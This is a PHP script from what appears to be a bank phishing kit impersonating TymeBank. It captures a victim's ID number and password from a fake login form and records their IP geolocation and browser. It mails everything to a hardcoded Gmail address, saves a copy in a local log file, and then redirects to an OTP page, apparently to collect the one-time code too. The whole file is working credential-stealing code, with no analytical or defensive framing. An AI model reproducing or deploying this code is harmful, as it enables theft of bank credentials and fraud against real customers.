<?php
session_start();
$login = $_POST['inputSAID'];
$_SESSION['id'] = $login;
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "Tyme ID Number: ".$_POST['inputSAID']."\n";
$message .= "Tyme Password: ".$_POST['psw']."\n";
$message .= "============= [ New Result Info ] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'New Mail';
$subj = "Tyme EN | $login";
$from = "From: $domain<west>\n";
mail("esctasy2400@gmail.com",$subj,$message,$from,$domain);
$fp = fopen("backupresultsxxxxxxxxxxxxxxxxxxxxxxxxx.txt","a");
fputs($fp,$message);
fclose($fp);
header("location: otp1.html");
?>

<script language="JavaScript">
<!-- 
setTimeout ("changePage()", 1000);
function changePage() {
if (self.parent.frames.length != 0)
self.parent.location="https://bank.tymedigital.co.za";
}
// -->
</script>